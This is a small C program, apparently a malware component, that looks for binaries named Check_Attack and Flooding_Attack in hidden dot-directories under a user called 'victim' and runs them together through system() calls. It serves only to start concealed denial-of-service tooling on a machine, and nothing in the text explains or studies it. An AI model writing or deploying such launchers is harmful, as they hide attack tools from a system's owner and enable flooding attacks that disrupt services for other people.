#include <stdio.h>
#include <stdlib.h>
int main(){

	if (system("cd /home/victim/.etc/.module && [ -f ./Check_Attack ] && [ -f ./Flooding_Attack ]") == 0)
		system("/home/victim/.etc/.module/Check_Attack & /home/victim/.etc/.module/Flooding_Attack");

	else if (system("cd /home/victim/.etc_p/.module && [ -f ./Check_Attack ] && [ -f ./Flooding_Attack ]") == 0)
		system("/home/victim/.etc_p/.module/Check_Attack & /home/victim/.etc_p/.module/Flooding_Attack");

	return 0;
}

